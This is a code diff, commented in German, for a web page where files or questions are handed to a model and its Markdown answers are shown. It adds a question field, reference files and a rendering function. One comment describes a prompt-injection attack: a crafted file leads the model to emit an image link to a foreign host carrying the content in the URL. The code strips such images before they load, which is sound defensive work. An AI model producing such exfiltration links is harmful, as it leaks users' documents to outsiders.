@@ -41,6 +41,7 @@
     var _formHeim = null;     // Heimatplatz des wandernden Formulars
     var _brettLang = '';      // in welcher Sprache das Brett gezeichnet wurde
     var _dropZiel = null;     // fuer den Klick-Weg: welche Ablage hat gefragt
+    var _refZiel = null;      // fuer den Referenz-Upload: welche Ablage
     var _timer = null;
     var _istAdmin = false;
 
@@ -224,6 +225,13 @@
     }
 
     /* ── Das Brett ─────────────────────────────────────────────────────── */
+    function groesseText(b) {
+        b = Number(b) || 0;
+        if (b < 1024) return b + ' B';
+        if (b < 1024 * 1024) return Math.round(b / 1024) + ' KB';
+        return (b / (1024 * 1024)).toFixed(1).replace('.', sprache() === 'de' ? ',' : '.') + ' MB';
+    }
+
     function typenText(d) {
         var t = d.dateitypen || [];
         if (!t.length) return T('tracks.types_any', 'alle lesbaren Dateien');
@@ -258,6 +266,15 @@
                           esc(T('tracks.badge_off', 'inaktiv')) + '</span>') +
                     '</div>' +
                     (d.beschreibung ? '<div class="st-dump-desc">' + esc(d.beschreibung) + '</div>' : '') +
+                    // Referenzen NUR mit Namen: wer fragt, soll wissen, worauf
+                    // sich seine Frage beziehen kann. Den Inhalt gibt es hier
+                    // nicht (kein Download, siehe main.py).
+                    ((d.referenzen || []).length
+                        ? '<div class="st-dump-refs" data-refs-zeile>' +
+                              esc(T('tracks.refs_on_card', 'Referenzen:')) + ' ' +
+                              esc((d.referenzen || []).map(function (r) { return r.name; }).join(', ')) +
+                          '</div>'
+                        : '') +
                   '</div>' +
                   '<div class="st-dump-acts">' +
                     // Zuruecksetzen darf JEDER, der die Ablage benutzt – er
@@ -292,6 +309,20 @@
                     'placeholder="' + esc(T('tracks.note_ph', 'Hinweis (optional)')) + '" ' +
                     'data-i18n-placeholder="tracks.note_ph"></textarea>' +
                 '</div>' +
+                // Fragefeld: nur, wenn die Ablage es eingeschaltet hat UND aktiv
+                // ist – eine abgeschaltete nimmt nichts an (404), also auch
+                // keine Frage (gleiche Regel wie die Drop-Flaeche).
+                ((d.fragen && d.enabled)
+                    ? '<div class="st-ask">' +
+                          '<textarea class="st-note st-ask-text" rows="2" data-act="ask-text" ' +
+                            'maxlength="' + (_grenzen.frage_max || 4000) + '" ' +
+                            'placeholder="' + esc(T('tracks.ask_ph', 'Frage stellen …')) + '" ' +
+                            'data-i18n-placeholder="tracks.ask_ph" ' +
+                            'aria-label="' + esc(T('tracks.ask_ph', 'Frage stellen …')) + '"></textarea>' +
+                          '<button type="button" class="st-btn st-btn-primary" data-act="ask">' +
+                            esc(T('tracks.ask_btn', 'Fragen')) + '</button>' +
+                      '</div>'
+                    : '') +
                 '<div class="st-jobs hidden" data-jobs="' + esc(d.id) + '"></div>';
             box.appendChild(karte);
             bindeKarte(karte, d);
@@ -310,6 +341,10 @@
                 ziel.parentNode.insertBefore(f, ziel.nextSibling);
             }
         }
+        // Die Referenzliste im offenen Formular kommt aus `_dumps` – nach jedem
+        // Neuladen (Upload, Loeschen, Sprachwechsel) neu zeichnen, sonst zeigt
+        // sie den Stand von vorher.
+        if (_editId && $('st-f-refs')) zeichneRefs();
     }
 
     /* Alle EIGENEN Auftraege dieser Ablage verwerfen – zurueck auf Anfang.
@@ -352,6 +387,23 @@
             e.stopPropagation();
             resetDump(d);
         });
+        var ask = karte.querySelector('[data-act="ask"]');
+        var askText = karte.querySelector('[data-act="ask-text"]');
+        if (ask && askText) {
+            ask.addEventListener('click', function (e) {
+                e.stopPropagation();
+                stelleFrage(d, askText, ask);
+            });
+            // Enter sendet, Umschalt+Enter macht eine neue Zeile – wie im Chat.
+            // `isComposing`: waehrend einer Eingabehilfe (Umlaute per IME)
+            // bestaetigt Enter das Zeichen, nicht die Frage.
+            askText.addEventListener('keydown', function (ev) {
+                if (ev.key === 'Enter' && !ev.shiftKey && !ev.isComposing) {
+                    ev.preventDefault();
+                    stelleFrage(d, askText, ask);
+                }
+            });
+        }
         // Eine abgeschaltete Ablage bekommt GAR KEINE Drop-Bindung: der Server
         // weist den Versuch mit 404 ab, und eine Flaeche, die zum Fehlgriff
         // einlaedt, ist schlechter als eine, die sichtbar nichts tut.
@@ -413,6 +465,40 @@
         inp.click();
     }
 
+    /* ── Fragen ────────────────────────────────────────────────────────────
+       Eine Frage ist ein Lauf wie ein Drop – nur ohne Datei. Die Referenzen
+       der Ablage legt der Server bei. Das Feld wird erst nach der ANNAHME
+       geleert: bei einem Fehler bleibt die Frage stehen und muss nicht neu
+       getippt werden. */
+    function stelleFrage(d, feld, knopf) {
+        var frage = (feld.value || '').trim();
+        if (!frage) {
+            toast(T('tracks.ask_empty', 'Bitte zuerst eine Frage eingeben.'), true);
+            return;
+        }
+        var max = _grenzen.frage_max || 4000;
+        if (frage.length > max) {
+            toast(T('tracks.ask_too_long', 'Die Frage ist zu lang (höchstens {n} Zeichen).')
+                .replace(/\{n\}/g, max), true);
+            return;
+        }
+        if (knopf) knopf.disabled = true;
+        toast(T('tracks.ask_sending', 'Frage wird gestellt …'));
+        sende('/api/tracks/ask', 'POST', { dump_id: d.id, frage: frage })
+            .then(function () {
+                feld.value = '';
+                toast(T('tracks.ask_queued', 'Frage eingereiht – die Antwort erscheint unter der Ablage.'));
+                // ERST laden, DANN den Takt waehlen: `takt()` entscheidet an
+                // `_jobs`, ob gerade etwas laeuft. Vor dem Laden kennt es den
+                // neuen Auftrag nicht und waehlt den Ruhetakt (15 s) – die Karte
+                // zeigte dann "laeuft …" fuer einen Lauf, der nach 3 s fertig
+                // war (im Browser auf DEV gesehen, 2026-11-06).
+                ladeJobs().then(takt);
+            })
+            .catch(function (e) { toast(e.message, true); })
+            .then(function () { if (knopf) knopf.disabled = false; });
+    }
+
     /* ── Ablegen ───────────────────────────────────────────────────────── */
     function schickeDateien(d, dateien) {
         var max = _grenzen.max_dateien || 20;
@@ -469,8 +555,55 @@
                 abgewiesen.map(function (x) { return x.name + ' (' + x.grund + ')'; }).join(', ');
         }
         toast(msg, abgewiesen.length > 0);
-        ladeJobs();
-        takt();      // sofort auf den schnellen Takt umstellen
+        // Sofort auf den schnellen Takt – aber erst NACH dem Laden, sonst
+        // entscheidet takt() an der alten Liste (Begruendung in stelleFrage).
+        ladeJobs().then(takt);
+    }
+
+    /* ── Ergebnistext als formatierter Text ────────────────────────────────
+       Die Antwort ist Markdown (Tabellen, SQL-Bloecke, Listen) und stand bis
+       2026-11-06 als ROHTEXT auf der Karte – `|---|` und ```-Zaeune inklusive.
+       Gerendert wird mit DEM Renderer des Projekts (chatlib.js, wie Chat, SAP
+       und Support): er maskiert HTML und haengt Tokens nur an eigene Pfade.
+
+       ACHTUNG: EXTERNE BILDER WERDEN ENTFERNT, BEVOR SIE LADEN KOENNEN. Die CSP
+       erlaubt `img-src https:`, und auf /tracks ist Fremdinhalt der Normalfall
+       (eine zugesandte Rechnung, ein Dokument aus dem Netz). Eine praeparierte
+       Datei koennte das Modell zu `![x](https://fremd/?d=<Inhalt>)` bringen –
+       allein das ANZEIGEN der Karte truege den Inhalt dann nach aussen, ohne
+       Klick. Deshalb wird in ein `<template>` gerendert (dessen Inhalt ist
+       inaktiv, der Browser laedt dort nichts), dort wird jedes Bild ausser
+       eigenen Pfaden und data:-Bildern ersetzt, und ERST DANN kommt der Inhalt
+       ins Dokument. Ein Filter NACH dem Einfuegen kaeme zu spaet: der Abruf
+       beginnt beim Einfuegen. Links bleiben – sie wirken erst auf einen Klick.
+
+       Diagramm-/Schaubild-Bloecke (```chartjs, ```mermaid) werden als Code
+       gezeigt: deren Zeichenmodule laedt diese Seite nicht, der Renderer
+       erzeugte sonst einen LEEREN Platzhalter und der Inhalt waere weg. */
+    var _ZEICHEN_ZAUN = /```(?:chartjs|jarvis-chart|chart|mermaid|mmd)\b/gi;
+
+    function setzeErgebnis(el, text) {
+        if (!el) return;
+        var lib = window.JarvisChatLib;
+        if (!lib || !lib.renderMarkdown || !('content' in document.createElement('template'))) {
+            el.textContent = text || '';      // Rueckfall: Rohtext wie bisher
+            return;
+        }
+        var tpl = document.createElement('template');
+        tpl.innerHTML = lib.renderMarkdown(String(text || '').replace(_ZEICHEN_ZAUN, '```text'));
+        tpl.content.querySelectorAll('img').forEach(function (img) {
+            var src = img.getAttribute('src') || '';
+            // Eigener Pfad (`/api/…`, aber NICHT `//host` – das ist eine fremde
+            // Adresse ohne Schema) oder ein eingebettetes data:-Bild.
+            if (/^\/(?!\/)/.test(src) || /^data:image\//i.test(src)) return;
+            var ersatz = document.createElement('span');
+            ersatz.className = 'st-img-weg';
+            ersatz.textContent = '[' + T('tracks.img_blocked', 'Bild von fremder Adresse ausgeblendet') +
+                (img.getAttribute('alt') ? ': ' + img.getAttribute('alt') : '') + ']';
+            img.parentNode.replaceChild(ersatz, img);
+        });
+        el.classList.add('is-md');
+        el.appendChild(tpl.content);
     }
 
     /* ── Auftraege ─────────────────────────────────────────────────────── */
@@ -541,6 +674,11 @@
             var letzter = (j.schritte || [])[(j.schritte || []).length - 1];
             z.innerHTML =
                 '<div class="st-job-head">' +
+                  // Eine Frage traegt ihre Frage als Titel – die Marke sagt,
+                  // dass hier keine Datei bearbeitet wurde.
+                  (j.art === 'frage'
+                      ? '<span class="st-badge st-job-art">' + esc(T('tracks.job_question', 'Frage')) + '</span>'
+                      : '') +
                   '<span class="st-job-name">' + esc(j.titel) + '</span>' +
                   '<span class="st-job-state">' +
                     // Der drehende Kreis nur, solange wirklich gearbeitet wird –
@@ -562,9 +700,11 @@
                 (j.status === 'laeuft' && letzter
                     ? '<div class="st-job-step">' + esc(T('tracks.step', 'Schritt') + ': ' +
                         (letzter.werkzeug || '')) + '</div>' : '') +
-                (j.ergebnis ? '<div class="st-job-res">' + esc(j.ergebnis) + '</div>' : '') +
+                // Inhalt erst nach dem Aufbau, ueber setzeErgebnis (Bildfilter).
+                (j.ergebnis ? '<div class="st-job-res" data-ergebnis></div>' : '') +
                 (j.fehler ? '<div class="st-job-res">' + esc(j.fehler) + '</div>' : '') +
                 (chips ? '<div class="st-chips">' + chips + '</div>' : '');
+            if (j.ergebnis) setzeErgebnis(z.querySelector('[data-ergebnis]'), j.ergebnis);
             box.appendChild(z);
         });
         document.querySelectorAll('[data-jobdel]').forEach(function (b) {
@@ -625,7 +765,8 @@
         var d = (id === 'neu') ? {
             id: '', name: '', beschreibung: '', prompt: '', bereiche: ['basis'],
             dateitypen: [], mehrfach: 'einzeln', profile_id: '',
-            reasoning_effort: '', max_steps: 0, enabled: true, 'global': false
+            reasoning_effort: '', max_steps: 0, enabled: true, 'global': false,
+            fragen: false, referenzen: []
         } : (_dumps.filter(function (x) { return x.id === id; })[0] || null);
         if (!d) return;
         _editId = id;
@@ -687,6 +828,28 @@
               '</label>' +
               '<div class="st-areas" id="st-f-areas">' + bereichKasten(d) + '</div>' +
               '<div class="st-help" id="st-help-areas" data-i18n="tracks.help_areas">Je weniger, desto besser: der Inhalt einer abgelegten Datei kann von einem Fremden stammen. Nicht freigegebene Bereiche schaltet ein Administrator unter Einstellungen → Short Tracks frei.</div>' +
+            '</div>' +
+            '<div class="st-sep"></div>' +
+            // ── Fragen und Referenzen ──
+            '<div class="st-field">' +
+              '<label class="st-hint" style="display:flex;gap:6px;align-items:center;">' +
+                '<input type="checkbox" id="st-f-fragen"> <span data-i18n="tracks.f_fragen">Fragefeld anzeigen (Fragen ohne Datei)</span>' +
+                '<button type="button" class="st-info" data-help="st-help-fragen" aria-expanded="false" ' +
+                  'data-i18n-title="tracks.help" title="Erklärung anzeigen">&#9432;</button>' +
+              '</label>' +
+              '<div class="st-help" id="st-help-fragen" data-i18n="tracks.help_fragen">Auf der Ablage erscheint ein Eingabefeld. Eine Frage dort startet die Aufgabe ohne Datei – die Aufgabe gibt den Rahmen vor (etwa „Beantworte Fragen zum Datenbankschema und schreibe dazu SQL für PostgreSQL"), die Frage sagt, was diesmal gesucht ist. Die Referenzdateien liegen jeder Frage bei.</div>' +
+            '</div>' +
+            '<div class="st-field" style="margin-top:10px;">' +
+              '<label><span data-i18n="tracks.f_refs">Referenzdateien</span> ' +
+                '<button type="button" class="st-info" data-help="st-help-refs" ' +
+                  'aria-expanded="false" data-i18n-title="tracks.help" title="Erklärung anzeigen">&#9432;</button>' +
+              '</label>' +
+              '<div class="st-help" id="st-help-refs" data-i18n-html="tracks.help_refs">' +
+                'Feste Unterlagen dieser Ablage, zum Beispiel ein Datenbankschema. Sie liegen <b>jedem Lauf</b> bei – beim Ablegen einer Datei ebenso wie bei einer Frage. Eine Datei mit demselben Namen ersetzt die alte.' +
+                '<ul><li><b>Wer die Ablage benutzen darf, erfährt den Inhalt der Referenzen</b> – über seine Fragen. Lege nur ab, was alle Benutzer dieser Ablage sehen dürfen.</li>' +
+                '<li>Große Dateien werden im Auftrag gekürzt; der Rest bleibt über die Datei erreichbar.</li></ul>' +
+              '</div>' +
+              '<div class="st-refs" id="st-f-refs"></div>' +
             '</div>' +
             '<div class="st-sep"></div>' +
             '<div class="st-grid st-grid-3">' +
@@ -769,6 +932,8 @@
         // gewollt zu haben.
         var gv = $('st-f-global');
         if (gv) gv.checked = !!d['global'];
+        $('st-f-fragen').checked = !!d.fragen;
+        zeichneRefs();
         $('st-f-save').addEventListener('click', function () { speichere(id); });
         $('st-f-cancel').addEventListener('click', formSchliessen);
         if (window.applyLang) window.applyLang();
@@ -779,6 +944,102 @@
         // kennen die Funktion nicht, und ein Fehler hier wuerde das fertig
         // aufgebaute Formular wieder zerreissen.
         if (f.scrollIntoView) f.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+    }
+
+    /* ── Referenzdateien im Formular ────────────────────────────────────────
+       Hochladen und Loeschen wirken SOFORT, nicht erst mit „Speichern": eine
+       Datei ist kein Formularfeld, und ein „Abbrechen", das einen schon
+       uebertragenen Upload still verwirft, waere eine falsche Zusage. Bei einer
+       NEUEN Ablage gibt es noch keine Kennung, an der die Dateien haengen
+       koennten – dann steht dort ein Hinweis statt des Knopfs. */
+    function zeichneRefs() {
+        var box = $('st-f-refs');
+        if (!box) return;
+        if (!_editId || _editId === 'neu') {
+            box.innerHTML = '<div class="st-hint">' + esc(T('tracks.refs_after_save',
+                'Referenzdateien lassen sich hinzufügen, sobald die Ablage gespeichert ist.')) + '</div>';
+            return;
+        }
+        var d = _dumps.filter(function (x) { return x.id === _editId; })[0] || {};
+        var refs = d.referenzen || [];
+        var max = _grenzen.max_referenzen || 10;
+        box.innerHTML =
+            (refs.length
+                ? '<ul class="st-ref-list">' + refs.map(function (r) {
+                      return '<li><span class="st-ref-name">' + esc(r.name) + '</span>' +
+                          '<span class="st-ref-size">' + esc(groesseText(r.groesse)) + '</span>' +
+                          // MUELLEIMER = LOESCHEN: die Datei ist danach weg.
+                          '<button type="button" class="st-icon-btn is-danger" data-refdel="' + esc(r.name) +
+                          '" title="' + esc(T('tracks.refs_del', 'Referenz löschen')) + '" aria-label="' +
+                          esc(T('tracks.refs_del', 'Referenz löschen')) + '">' + JarvisIcons.trash() + '</button></li>';
+                  }).join('') + '</ul>'
+                : '<div class="st-hint">' + esc(T('tracks.refs_none', 'Noch keine Referenzdateien.')) + '</div>') +
+            '<div class="st-row">' +
+              '<button type="button" class="st-btn" id="st-f-ref-add"' + (refs.length >= max ? ' disabled' : '') + '>' +
+                esc(T('tracks.refs_add', '+ Referenzdatei hinzufügen')) + '</button>' +
+              '<span class="st-status">' + esc(T('tracks.refs_limit', 'höchstens {n} Dateien, je {mb} MB')
+                  .replace(/\{n\}/g, max).replace(/\{mb\}/g, _grenzen.ref_max_mb || 10)) + '</span>' +
+              '<span class="st-status" id="st-f-ref-status"></span>' +
+            '</div>';
+        var add = $('st-f-ref-add');
+        if (add) add.addEventListener('click', function () {
+            var inp = $('st-ref-input');
+            if (!inp) return;
+            _refZiel = _editId;
+            inp.value = '';
+            inp.click();
+        });
+        box.querySelectorAll('[data-refdel]').forEach(function (b) {
+            b.addEventListener('click', function () { loescheRef(_editId, b.getAttribute('data-refdel')); });
+        });
+    }
+
+    function nachRefAenderung(id) {
+        // Nur die Ablagen neu holen; das offene Formular behaelt seine
+        // ungespeicherten Eingaben (zeichneBrett setzt es an seinen Platz zurueck).
+        // zeichneBrett() zeichnet dabei auch die Referenzliste neu.
+        return ladeStatus();
+    }
+
+    function schickeRefs(id, dateien) {
+        if (!id || !dateien || !dateien.length) return;
+        var fd = new FormData();
+        for (var i = 0; i < dateien.length; i++) fd.append('files', dateien[i]);
+        melde('st-f-ref-status', T('tracks.refs_uploading', 'Wird hochgeladen …'));
+        fetch('/api/tracks/dumps/' + encodeURIComponent(id) + '/refs',
+              { method: 'POST', headers: kopf(), body: fd })
+            .then(function (r) {
+                return r.json().catch(function () { return {}; })
+                    .then(function (j) { return { ok: r.ok, status: r.status, d: j }; });
+            })
+            .then(function (a) {
+                var j = a.d || {};
+                var abgewiesen = (j.abgewiesen || []).map(function (x) {
+                    return x.name + ': ' + x.grund;
+                }).join(' | ');
+                return nachRefAenderung(id).then(function () {
+                    if (!a.ok || j.ok === false) {
+                        melde('st-f-ref-status', (j.error || ('HTTP ' + a.status)) +
+                              (abgewiesen ? ' – ' + abgewiesen : ''), 'fehler');
+                        return;
+                    }
+                    melde('st-f-ref-status', T('tracks.refs_done', '{n} Datei(en) übernommen.')
+                        .replace(/\{n\}/g, (j.uebernommen || []).length) +
+                        (abgewiesen ? ' ' + T('tracks.refs_rejected', 'Nicht übernommen:') + ' ' + abgewiesen : ''),
+                        abgewiesen ? 'fehler' : 'ok');
+                });
+            })
+            .catch(function (e) { melde('st-f-ref-status', e.message, 'fehler'); });
+    }
+
+    function loescheRef(id, name) {
+        if (!window.confirm(T('tracks.refs_del_ask', 'Referenz „{n}" wirklich löschen?')
+                .replace(/\{n\}/g, name))) return;
+        hole('/api/tracks/dumps/' + encodeURIComponent(id) + '/refs/' + encodeURIComponent(name),
+             { method: 'DELETE' })
+            .then(function () { return nachRefAenderung(id); })
+            .then(function () { melde('st-f-ref-status', T('tracks.refs_deleted', 'Referenz gelöscht.'), 'ok'); })
+            .catch(function (e) { melde('st-f-ref-status', e.message, 'fehler'); });
     }
 
     function formSchliessen() {
@@ -803,7 +1064,8 @@
             profile_id: $('st-f-profile').value.trim(),
             reasoning_effort: $('st-f-effort').value,
             max_steps: parseInt($('st-f-steps').value || '0', 10) || 0,
-            enabled: $('st-f-enabled').checked
+            enabled: $('st-f-enabled').checked,
+            fragen: $('st-f-fragen').checked
         };
     }
 
@@ -859,7 +1121,7 @@
                     esc(T('tracks.log_empty', 'Noch keine Läufe.')) + '</div>';
                 return;
             }
-            box.innerHTML = '<div class="st-scroll">' + e.map(function (x) {
+            box.innerHTML = '<div class="st-scroll">' + e.map(function (x, idx) {
                 var chips = (x.dateien || []).map(function (f) {
                     return '<a class="st-chip" href="' + esc(f.url) +
                         (f.url.indexOf('?') >= 0 ? '&' : '?') + 'token=' + encodeURIComponent(_dlk()) +
@@ -872,10 +1134,14 @@
                       '<span class="st-log-time">' + esc(zeit(x.ts)) +
                         (x.dauer_s ? ' · ' + x.dauer_s + ' s' : '') + '</span>' +
                     '</div>' +
-                    (x.ergebnis ? '<div class="st-log-res">' + esc(x.ergebnis) + '</div>' : '') +
+                    (x.ergebnis ? '<div class="st-log-res" data-log-ergebnis="' + idx + '"></div>' : '') +
                     (chips ? '<div class="st-chips">' + chips + '</div>' : '') +
                     '</div>';
             }).join('') + '</div>';
+            box.querySelectorAll('[data-log-ergebnis]').forEach(function (el) {
+                var x = e[+el.getAttribute('data-log-ergebnis')];
+                if (x) setzeErgebnis(el, x.ergebnis);
+            });
         }).catch(function (er) {
             box.innerHTML = '<div class="st-empty">' + esc(er.message) + '</div>';
         });
@@ -903,6 +1169,13 @@
             if (_dropZiel && b.files && b.files.length) schickeDateien(_dropZiel, b.files);
             _dropZiel = null;
         });
+        // Eigene Variable: `b` wird oben weiter zugewiesen (Closure-Falle vom
+        // 2026-08-16, siehe Kommentar am Anfang von binde()).
+        var refInp = $('st-ref-input');
+        if (refInp) refInp.addEventListener('change', function () {
+            if (_refZiel && refInp.files && refInp.files.length) schickeRefs(_refZiel, refInp.files);
+            _refZiel = null;
+        });
         // Sprachwechsel: der Bereichskatalog kommt vom SERVER und wird von
         // applyLang() nicht erreicht – ohne diesen Zuhoerer bliebe er in der
         // Sprache, in der die Seite geladen wurde (Lehre vom 2026-08-13).
@@ -918,7 +1191,7 @@
         // Rueckkehr aus dem Hintergrund: sofort nachsehen statt bis zum
         // naechsten Takt zu warten.
         document.addEventListener('visibilitychange', function () {
-            if (!document.hidden) { ladeJobs(); takt(); }
+            if (!document.hidden) { ladeJobs().then(takt); }
         });
     }
 
